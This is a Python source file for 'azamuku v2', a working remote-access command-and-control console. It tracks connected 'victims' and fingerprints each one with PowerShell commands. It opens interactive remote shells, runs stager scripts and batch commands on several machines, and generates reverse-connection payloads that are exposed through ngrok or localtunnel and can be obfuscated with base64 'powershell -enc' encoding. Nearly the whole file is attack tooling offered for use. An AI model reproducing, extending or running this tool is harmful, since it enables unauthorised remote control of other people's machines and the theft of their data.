#!/usr/bin/python3
import core.server as s
from prettytable import PrettyTable
import time
import threading
import argparse
import os
import subprocess
import re
import sys
import atexit
import base64 as _b64

"""
written by otter - github.com/whatotter
supported by Fan2K - github.com/Christian93111

"""

stager = None
newest = None

# TEMPORARILY DISABLED
# hotPlug = False
# hotPlugPort = None

selected = []

def getInfo():
    global stager, newest, args
    old = 0

    while True:
        if len(s.connects) < old:
            old = len(s.connects)
            continue

        if len(s.connects) > old:
            newUID = s.connects[-1]
            control = s.client(newUID)


            if args.strict == False:
                mac_cmd = (
                    "$m = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.MacAddress -ne '' -and "
                    "$_.InterfaceDescription -notmatch 'Virtual|Loopback|Tunnel|WAN Miniport|Bluetooth|Hyper-V' } | "
                    "Sort-Object -Property Speed -Descending | Select-Object -First 1).MacAddress; "
                    "if ($m) { $m.Replace('-',':') } else { "
                    "$m2 = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.MacAddress -ne '' } | "
                    "Select-Object -First 1).MacAddress; "
                    "if ($m2) { $m2.Replace('-',':') } else { 'unknown' } }"
                )
                s.vicInfo[newUID] = {
                    "hostname": control.run("whoami"),
                    "mac": control.run(mac_cmd).strip(),
                    "ip": s.client_ips.get(newUID, "unknown"),
                    "arch": "x86" if control.run("(Get-WmiObject -Class Win32_Processor).Architecture") == "0" else "x64",
                }
            else:
                s.vicInfo[newUID] = {
                    "hostname": "strict mode active",
                    "mac": "strict mode active",
                    "ip": "strict mode active",
                    "arch": "strict mode active"
                }

            if stager == None:
                pass
            else:
                try:
                    for x in open(stager, "r").read().split("\n"):
                        control.run(x)
                except Exception as e:
                    print("\n[+] failed to run stager on uid '{}' - '{}'".format(x, e))

            # Notify user of new connection
            try:
                ip_addr = s.vicInfo[newUID]['ip']
                hostname = s.vicInfo[newUID]['hostname']
                print(f"\n\n[!] New victim connected: {newUID} ({hostname} @ {ip_addr})\n")
                print("[" + coolFade("azamuku v2", (125,0,0), (125,0,0)).strip() +"]> ", end="", flush=True)
            except:
                print(f"\n\n[!] New victim connected: {newUID} ({hostname})\n")
                print("[" + coolFade("azamuku v2", (125,0,0), (125,0,0)).strip() +"]> ", end="", flush=True)

            if newest == False:
                newest = newUID

            old = len(s.connects)

        else:
            time.sleep(0.1)    

def monitorConnections():
    """
    Monitor client connections and detect when they disconnect
    Checks if clients have been inactive for more than the timeout period
    """
    global args
    timeout = 15  # seconds of inactivity before considering a client disconnected
    
    while True:
        current_time = time.time()
        
        # Check each connected client
        for uid in list(s.connects):
            # Skip if we don't have last seen data yet
            if uid not in s.lastSeen:
                s.lastSeen[uid] = current_time
                continue
            
            # Check if client has been inactive for too long
            time_since_last_seen = current_time - s.lastSeen[uid]
            
            if time_since_last_seen > timeout:
                # Client has disconnected
                if uid not in s.disconnected:
                    s.disconnected.append(uid)
                    s.connects.remove(uid)
                    
                    # Notify user of disconnection
                    try:
                        if uid in s.vicInfo:
                            ip_addr = s.vicInfo[uid].get('ip', 'unknown')
                            hostname = s.vicInfo[uid].get('hostname', 'unknown')
                        else:
                            print(f"\n\n[X] Connection lost: {uid}\n")
                    except:
                        print(f"\n\n[X] Connection lost: {uid}\n")
        time.sleep(5)  # Check every 5 seconds
    

def coolFade(text, start, end):
    """
    cool text fade thingymabob
    """

    os.system("")

    def getValidValue(color):
        """fix the value and return it (if its >255, put 255 instead)"""
        if color > 255: return 255
        elif color < 0: return 0
        else: return color

    coloredLines = []
    # math
    lines = text.split("\n")

    r, g, b = start

    r1, g1, b1 = start
    r2, g2, b2 = end

    rInterval = round((r1 - r2) / len(lines)) * -1
    gInterval = round((g1 - g2) / len(lines)) * -1
    bInterval = round((b1 - b2) / len(lines)) * -1

    for x in lines:
        r = getValidValue(r + rInterval)
        g = getValidValue(g + gInterval)
        b = getValidValue(b + bInterval)

        coloredLines.append("\033[38;2;{};{};{}m{}\033[0m".format((r), (g), (b), x))

    return '\n'.join(coloredLines) + "\033[0m"

def highlight(text:str, highlight:list, color=(0, 255, 0)):
    for x in highlight:
        highlightText = "\033[38;2;{};{};{}m{}\033[0m".format(color[0], color[1], color[2], x)
        text = text.replace(x, highlightText)
    return text

def interactive(uid):
    victim = s.client(uid)
    try:
        pwd = "\nPS " + victim.run('"$pwd"').strip() + "> "
    except Exception as e:
        print(f"\n[X] Failed to start shell: {e}")
        return

    while True:
        if uid not in s.connects:
            print(f"\n[X] Connection lost to {uid} - returning to menu")
            break

        try:
            command = input(pwd)
            if command in ["quit", "exit"]:
                break
            elif command.split(" ")[0] in ["cd"]:
                # We need to run this on the victim to update pwd
                # The victim.run call will handle disconnection check now
                try: 
                    pwd = "\nPS " + victim.run('"$pwd"').strip() + "> "
                    continue
                except ConnectionError:
                    print(f"\n[X] Connection lost to {uid} - returning to menu")
                    break
                except Exception as e:
                    print(f"[!] Error updating pwd: {e}")
                    pass

        except KeyboardInterrupt:
            print('\n\n[+] breaking out of shell due to ctrl+c\n')
            break
        except EOFError:
            break
        
        try:
            if command:
                print(coolFade(victim.run(command), (150, 150, 150), (150, 150, 150)))
        except KeyboardInterrupt:
            print("\n[+] command interrupted")
        except ConnectionError:
            print(f"\n[X] Connection lost to {uid} - returning to menu")
            break
        except Exception as e:
            print(f"[!] Error running command: {e}")

    return None

def _to_charcode(text):
    """Convert a string to PowerShell [char]0xNN obfuscated form."""
    return '+'.join(f'[char]0x{ord(c):02x}' for c in text)

def print_payload(payload, highlights, args):
    """Print payload, optionally encoding it as base64 or hex based on CLI flags."""
    if args.base64:
        encoded = _b64.b64encode(payload.encode('utf-16-le')).decode()
        print("[+] base64 encode:\n")
        print(f"powershell -enc {encoded}")
    else:
        print(highlight(payload, highlights, color=(150, 0, 0)))

if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument("-s",
                        "--server",
                        help="ip to bind the http(s) server to (default: 0.0.0.0)",
                        default="0.0.0.0")
    
    parser.add_argument("--http-port",
                        help="port to bind the http server to (default: 8080, or 0 if --https-port is set)",
                        default=None)
    
    parser.add_argument("--https-port",
                        help="port to bind the https server to (default: 0 (off))",
                        default="0")
    
    parser.add_argument("--certfile",
                        help="certfile for the https server (https://stackoverflow.com/a/10176685) (default: server.pem)",
                        default="server.pem")
    
    parser.add_argument("--keyfile",
                        help="keyfile for the https server (https://stackoverflow.com/a/10176685) (default: key.pem)",
                        default="key.pem")
    
    parser.add_argument("--stager",
                        help="a stager text file that executes commands from a text file, line by line (default: None)",
                        default=None)
    
    parser.add_argument("--strict",
                        help="disable information gathering commands",
                        action="store_true",
                        default=False)
    
    parser.add_argument("-lt", "--localtunnel",
                        help="use localtunnel for tunneling (requires localtunnel to be installed)",
                        action="store_true",
                        default=False)
    
    parser.add_argument("-ng", "--ngrok",
                        help="use ngrok for tunneling (requires ngrok to be installed)",
                        action="store_true",
                        default=False)
                        
    parser.add_argument("-b64", "--base64",
                        help="encode generated payloads as base64 (powershell -enc)",
                        action="store_true",
                        default=False)

    args = parser.parse_args()

    # If --http-port wasn't explicitly set:
    #   - if --https-port is active, default HTTP to off (0)
    #   - otherwise default to 8080
    if args.http_port is None:
        args.http_port = "0" if int(args.https_port) != 0 else "8080"

    stager = args.stager
    srv = s.azamuku()
    
    # Tunnel setup - declare as global-like variable
    tunnel_process = None
    tunnel_url = None

    # Register cleanup handler
    def cleanup():
        try:
            if srv: srv.stop()
        except: pass
            
        if tunnel_process:
            print("\n[+] terminating tunnel process...")
            try:
                tunnel_process.terminate()
                tunnel_process.wait()
            except: pass
            
    atexit.register(cleanup)
    
    if args.localtunnel or args.ngrok:
        port = int(args.http_port) if int(args.http_port) != 0 else int(args.https_port)
        
        if args.localtunnel:
            try:
                print("\n[+] starting localtunnel...")
                # Generate a random subdomain to help with consistency
                import random
                import string
                subdomain = 'azamuku-' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                
                tunnel_process = subprocess.Popen(
                    ['lt', '-p', str(port), '-l', '127.0.0.1', '-s', subdomain],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    bufsize=1
                )
                # Read the tunnel URL
                print("[+] waiting for localtunnel to initialize...")
                import time as time_module
                start_time = time_module.time()
                timeout = 15
                
                while True:
                    if time_module.time() - start_time > timeout:
                        print("[X] timeout waiting for localtunnel URL")
                        break
                    
                    output = tunnel_process.stdout.readline()
                    if not output:
                        if tunnel_process.poll() is not None:
                            print("[X] localtunnel process terminated unexpectedly")
                            break
                        time_module.sleep(0.1)
                        continue
                    
                    output = output.strip()
                    
                    if "your url is" in output.lower():
                        # Extract URL and remove protocol
                        match = re.search(r'your url is:?\s*(https?://[^\s]+)', output, re.IGNORECASE)
                        if match:
                            full_url = match.group(1)
                            tunnel_url = re.sub(r'^https?://', '', full_url)
                            print(f"[+] localtunnel URL: {tunnel_url}")
                            break
                        else:
                            # Fallback: just remove common prefixes
                            tunnel_url = output.replace('your url is: https://', '').replace('your url is: ', '').replace('https://', '').replace('http://', '')
                            if tunnel_url and '.' in tunnel_url:
                                print(f"[+] localtunnel URL: {tunnel_url}")
                                break
                
                if not tunnel_url:
                    print("\n[X] failed to get localtunnel URL")
                    print("[!] you can still use azamuku, but you'll need to provide IP/port manually for payloads")
            except FileNotFoundError:
                print("[X] localtunnel not found - please install it: npm install -g localtunnel")
                sys.exit(1)
        
        elif args.ngrok:
            try:
                print("\n[+] starting ngrok...")
                tunnel_process = subprocess.Popen(
                    ['ngrok', 'http', str(port), '--log', 'stdout'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    bufsize=1
                )
                # Read ngrok output to get URL - with timeout
                print("[+] waiting for ngrok to initialize...")
                import time as time_module
                start_time = time_module.time()
                timeout = 15  # 15 seconds timeout
                
                while True:
                    if time_module.time() - start_time > timeout:
                        print("[X] timeout waiting for ngrok URL")
                        break
                    
                    output = tunnel_process.stdout.readline()
                    if not output:
                        if tunnel_process.poll() is not None:
                            print("[X] ngrok process terminated unexpectedly")
                            break
                        time_module.sleep(0.1)
                        continue
                    
                    output = output.strip()
                    
                    # Try multiple patterns for ngrok URL
                    if 'url=' in output.lower():
                        # Pattern: url=https://something.ngrok.io
                        match = re.search(r'url=(https?://[^\s]+)', output, re.IGNORECASE)
                        if match:
                            full_url = match.group(1)
                            # Extract just the domain part (remove http:// or https://)
                            tunnel_url = re.sub(r'^https?://', '', full_url)
                            print(f"[+] ngrok URL: {tunnel_url}")
                            break
                
                if not tunnel_url:
                    print("\n[X] failed to get ngrok URL - check if ngrok is properly configured")
                    print("[!] you can still use azamuku, but you'll need to provide IP/port manually for payloads")
            except FileNotFoundError:
                print("[X] ngrok not found - please install it from https://ngrok.com")
                sys.exit(1)

    if int(args.https_port) != 0:
        if not os.path.exists(args.certfile) :
            a = input("[X] certificate \"{}\" not found - would you like to create one? (also creates keyfile) (requires openssl) [y/n]".format(args.certfile)).lower()
            if a == "y":
                os.system("openssl req -x509 -newkey rsa:4096 -keyout key.pem -out server.pem -sha256 -days 365")
                print("[+] created keyfile 'key.pem' and certificate 'server.pem'")
                args.certfile = 'server.pem'; args.keyfile = 'key.pem'
            else:
                print('[X] no certificate found, and user declined - skipping HTTPS server..')
                args.https_port = 0

        elif not os.path.exists(args.keyfile):
            a = input("[X] keyfile \"{}\" not found - would you like to create one? (also creates certificate) (requires openssl) [y/n]".format(args.keyfile)).lower()
            if a == "y":
                os.system("openssl req -x509 -newkey rsa:4096 -keyout key.pem -out server.pem -sha256 -days 365")
                print("[+] created keyfile 'key.pem' and certificate 'server.pem'")
                args.certfile = 'server.pem'; args.keyfile = 'key.pem'
            else:
                print('[X] no keyfile found, and user declined - skipping HTTPS server..')
                args.https_port = 0

    tunnel_type = None
    if args.ngrok: tunnel_type = "ngrok"
    if args.localtunnel: tunnel_type = "localtunnel"

    srv.start(args.server, httpPort=int(args.http_port), httpsPort=int(args.https_port), certfile=args.certfile, keyfile=args.keyfile, tunnelType=tunnel_type)
    threading.Thread(target=getInfo, daemon=True).start()
    threading.Thread(target=monitorConnections, daemon=True).start()


    # banner
    print(coolFade(r"""
                                _           __      _____  
                               | |          \ \    / /__ \ 
  __ _ ______ _ _ __ ___  _   _| | ___   _   \ \  / /   ) |
 / _` |_  / _` | '_ ` _ \| | | | |/ / | | |   \ \/ /   / / 
| (_| |/ / (_| | | | | | | |_| |   <| |_| |    \  /   / /_ 
 \__,_/___\__,_|_| |_| |_|\__,_|_|\_\\__,_|     \/   |____|

""", (200, 0, 0), (75, 0, 0)))
    
    # random quote
    print("\"fool me once, shame on you - fool me twice, shame on me\"")
    print("       created by otter - github.com/whatotter")
    print("       supported by Fan2K - github.com/Christian93111\n")
    
    if int(args.http_port) != 0: print("[+] started azamuku's HTTP server @ {}:{}".format(args.server, args.http_port))
    if int(args.https_port) != 0: print("[+] started azamuku's HTTPS server @ {}:{}".format(args.server, args.https_port))
    if tunnel_url: print("[+] tunnel URL: {}".format(tunnel_url))
    print("[+] run 'help' for a list of commands - good luck :)")
    print("") # \n

    while True:

        try:
            inp = input("[" + coolFade("azamuku v2", (125,0,0), (125,0,0)).strip() +"]> ")
            cmd = inp.split(" ")[0]
            try:
                cArgs = inp.split(" ", 1)[-1]
                if cArgs.split(" ", 1)[0] == cmd:
                    cArgs = None
            except:
                cArgs = None

        except KeyboardInterrupt:
            if input("\n\n[+] are you sure you want to exit? this will kill all sessions, and break all shells [y/n]: ").lower() == "y":
                break
            else:
                continue
        except:
            continue

        print("") #\n

        try:
            if cmd.lower() == "clear":
                os.system("cls" if os.name == "nt" else "clear")
                continue

            elif cmd.lower() == "info":
                if len(list(s.vicInfo)) == 0:
                    print("no victims")
                    continue
                else:
                    first = list(s.vicInfo)[0] # is a uid
                    t = PrettyTable(["uid"] + list(s.vicInfo[first]) + ["status", "selected"])
                    for uid in s.vicInfo:
                        # Determine connection status
                        if uid in s.disconnected:
                            status = "disconnected"
                        elif uid in s.connects:
                            status = "connected"
                        else:
                            status = "unknown"
                        
                        t.add_row([uid] + [s.vicInfo[uid][x] for x in s.vicInfo[uid]] + [status, True if uid in selected else False])

                    print(t)

            elif cmd.lower() == "shell": # interactive shell
                if cArgs == None:
                    print("[+] not enough arguments - view \"help\" to view arguments for this command")
                    continue
                uid = cArgs.split(" ", 1)[0]
                if uid in s.connects:
                    interactive(uid)
                else:
                    print("[X] uid '{}' not valid - run command 'info' for a list of victims".format(uid))

            elif cmd.lower() == "payload":
                # If tunnel is active, use tunnel URL automatically
                if tunnel_url:
                    ip = tunnel_url
                    # For tunnels, we select the specific payload
                    target_payload = "tunnel.txt"
                    if args.ngrok: 
                        target_payload = "ngrok.txt"
                    elif args.localtunnel: 
                        target_payload = "localtunnel.txt"
                    
                    # we pass "443" as port just to satisfy the function signature, but it's not used in tunnel.txt/ngrok.txt
                    payload = s.payload.generatePayload(ip, "443", target_payload)
                    print_payload(payload, [ip], args)
                    
                    # TEMPORARILY DISABLED - hotplug payload generation
                    # if hotPlug:
                    #     print("\n   --- or, for hotplug/duckyscript attacks ---\n")
                    #     # Use specific hotplug payload
                    #     hotplug_payload = "tunnel_hotplug.txt"
                    #     if args.ngrok: hotplug_payload = "ngrok_hotplug.txt"
                    #     elif args.localtunnel: hotplug_payload = "localtunnel_hotplug.txt"

                    #     payload = s.payload.generatePayload(ip, "443", hotplug_payload)
                    #     print(highlight(payload, [ip], color=(150, 0, 0)))
                elif cArgs == None:
                    # No tunnel, no args - auto-use server IP and port(s) from startup args
                    ip = args.server if args.server != "0.0.0.0" else "127.0.0.1"

                    if int(args.http_port) != 0:
                        port = args.http_port
                        payload = s.payload.generatePayload(ip, port, "http.txt")
                        print("[+] HTTP payload ({}:{}):\n".format(ip, port))
                        print_payload(payload, [ip, port], args)

                    if int(args.https_port) != 0:
                        port = args.https_port
                        payload = s.payload.generatePayload(ip, port, "https.txt")
                        print("[+] HTTPS payload ({}:{}):\n".format(ip, port))
                        print_payload(payload, [ip, port], args)
                else:
                    # No tunnel, require IP and port arguments
                    if cArgs == None:
                        print("[+] not enough arguments - view \"help\" to view arguments for this command")
                        continue
                    ip, port = cArgs.split(" ", 1)
                    target_payload = "http.txt"
                    if int(port) == int(args.https_port) or int(port) == 443:
                        target_payload = "https.txt"
                    
                    # If using tunnel flags but without automatic tunnel URL (or with it), prioritize tunnel payloads
                    if args.ngrok:
                        target_payload = "ngrok.txt"
                    elif args.localtunnel:
                        target_payload = "localtunnel.txt"

                    payload = s.payload.generatePayload(ip, port, target_payload)
                    print_payload(payload, [ip, port], args)

                    # TEMPORARILY DISABLED - hotplug payload generation
                    # if hotPlug:
                    #     print("\n   --- or, for hotplug/duckyscript attacks ---\n")

                    #     payload = s.payload.generatePayload(ip, port, "hotplug.txt").replace("%hotplug%", str(hotPlugPort))
                    #     print(highlight(payload, [ip, port], color=(150, 0, 0)))

            elif cmd.lower() == "allow":
                if cArgs == None:
                    print("[+] not enough arguments - view \"help\" to view arguments for this command")
                    continue
                try:
                    if cArgs in os.listdir(os.path.dirname(cArgs)):
                        uids = open(cArgs, "r").read().split("\n")
                        for x in uids:
                            s.authorized.append(cArgs)
                        print("[+] allowed {} uids to connect back, from file '{}'".format(len(uids), cArgs))
                except:
                    pass
                
                s.authorized.append(cArgs)
                print('[+] allowed uid \'{}\' to connect back'.format(cArgs))

            elif cmd.lower() == "grab":
                if s.enableGrab == False:
                    print("[+] this allows *unauthenticated* payloads to be re-authenticated - be careful")
                    s.enableGrab = True
                    print("[+] enabled grabbing old sessions - toggle this by running 'grab' again")
                else:
                    s.enableGrab = False
                    print("[+] disabled grabbing")

            elif cmd.lower() == "export":
                with open(cArgs, "w") as f:
                    f.write('\n'.join(s.authorized))
                    f.flush()
                print("[+] exported {} uids to '{}' - use 'allow {}' to use them later, on this same server".format(len(s.authorized), cArgs, cArgs))

            elif cmd.lower() in ["help", "?", ""]:
                commands = {
                    "clear": ["clears the text screen on your terminal", "clear"],
                    "info": ["shows all victims connected to this azamuku instance, plus info", "info"],
                    "base64": ["converts a payload into encrypted base64", "base64 (payload)"],
                    "shell": ["runs an interactive shell on a specific uid", "shell (uid)"],
                    "payload": ["generates a payload (auto-uses tunnel URL if active)", "payload [ip] [port]"],
                    "allow": ["authorizes a uid, or a file of uids - ex: from an old payload", "allow (uid, file)"],
                    "grab": ["allows grabbing unauthorized uids connecting back to this server", "grab"],
                    "export": ["exports authorized uids for later use with allow", "export (file)"],
                    "exit": ["exit the system", "exit"],
                    "quit": ["synonymous to exit", "quit"],
                    "wait": ["launches an interactive shell the moment a client connects", "wait"],
                    # "hotplug": ["launches an server for hotplug attacks", "hotplug (port)"],
                    "rm": ["deletes a uid from authorized and from table", "rm (uid)"],
                    "select": ["selects a uid for multirun - can also select all with *", "select (uid)"],
                    "multirun": ["runs a command on each uid selected", "multirun (cmd)"],
                }

                t = PrettyTable(["command", "description", "usage"])
                t.align = "l"
                for k, v in commands.items():
                    t.add_row([k, v[0], v[1]])

                print(t)

            elif cmd.lower() in ["quit", "exit"]:
                if input("[+] are you sure you want to exit? this will kill all sessions, and break all shells [y/n]: ").lower() == "y":
                    break
                else:
                    continue

            elif cmd.lower() in ["rm", "remove", "del"]:
                if cArgs == None:
                    print("[+] not enough arguments - view \"help\" to view arguments for this command")
                    continue

                uid = cArgs.split(" ", 1)[0]
                try:
                    s.authorized.remove(uid)
                    s.vicInfo.pop(uid)
                    if uid in selected: selected.remove(uid)
                    print("[+] removed uid \"{}\" from authorized uid list".format(uid))
                except:
                    print("[X] couldn't remove uid \"{}\" - possibly doesn't exist?".format(uid))

            elif cmd.lower() == "wait":
                print("[+] waiting for newest shell connection..")
                
                newest = False
                while newest == False:
                    time.sleep(0.1)

                uid = newest
                
                print("[+] got shell with uid \"{}\"".format(uid))
                newest = None

                print("[+] pop thy shell")

                interactive(uid)

            elif cmd.lower() == "select":
                if cArgs == None:
                    print("[+] not enough arguments - view \"help\" to view arguments for this command")
                    continue

                uid = cArgs.split(" ", 1)[0]

                if uid == "*":
                    if selected != s.authorized:
                        selected = s.authorized
                        print("[+] moved all authorized uids to selected")
                    else:
                        selected = []
                        print("[+] removed all selected uids")

                if uid not in selected:
                    selected.append(uid)
                    print("[+] selected uid \"{}\"".format(uid))
                else:
                    selected.remove(uid)
                    print("[+] deselected uid \"{}\"".format(uid))


            elif cmd.lower() == "multirun":
                if cArgs == None:
                    print("[+] not enough arguments - view \"help\" to view arguments for this command")
                    continue

                command = cArgs

                if len(selected) == 0:
                    print("[+] no uids selected - use select command to select some")
                    continue

                for x in selected:
                    a = s.client(x)
                    try:
                        a.run(command)
                    except KeyboardInterrupt:
                        print("[+] ctrl+c - skipping \"{}\"".format(x))
                        continue

                    print("[+] ran command \"{}\" on uid \"{}\"".format(x, command))
            
            elif cmd.lower() == "base64":
                if cArgs == None:
                    print("[+] not enough arguments - usage: base64 (payload)")
                    continue
                encoded = _b64.b64encode(cArgs.encode('utf-16-le')).decode()
                print("[+] Base64 encoded payload:\n")
                print(f"powershell -enc {encoded}")

            else:
                print("[+] not a valid command - run 'help' for a table of them")
        except Exception as e:
            print(f"[!] Critical Error in main loop: {e}")

        print("") #\n
